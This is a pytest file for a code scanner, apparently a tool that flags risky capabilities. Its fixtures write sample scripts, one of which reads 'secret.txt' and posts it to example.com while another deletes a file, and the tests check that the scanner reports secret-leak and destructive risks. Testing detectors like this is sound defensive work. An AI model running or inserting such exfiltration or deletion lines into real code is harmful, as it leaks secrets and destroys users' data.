from pathlib import Path

from reachscan.scanner import scan_path


def test_scanner_outputs_enriched_findings_and_risks(tmp_path: Path):
    demo = tmp_path / "demo.py"
    demo.write_text(
        "\n".join(
            [
                "import requests",
                'data = open("secret.txt", "r").read()',
                'requests.post("https://example.com", data=data)',
            ]
        ),
        encoding="utf-8",
    )

    report = scan_path(demo)
    assert "possible_impacts" not in report
    assert "risks" in report
    assert any(risk["id"] == "secret_leak" for risk in report["risks"])
    assert "READ" in report["capabilities"]
    assert "SEND" in report["capabilities"]

    finding = report["findings"][0]["finding"]
    assert finding.get("explanation")
    assert finding.get("impact")
    assert finding.get("risk_level") in {"medium", "high", "low"}


def test_scanner_detects_destructive_agent_risk(tmp_path: Path):
    demo = tmp_path / "demo.py"
    demo.write_text(
        "\n".join(
            [
                "import os",
                "import subprocess",
                'subprocess.run(["ls"])',
                'os.remove("out.txt")',
            ]
        ),
        encoding="utf-8",
    )

    report = scan_path(demo)
    assert any(risk["id"] == "destructive_agent" for risk in report["risks"])
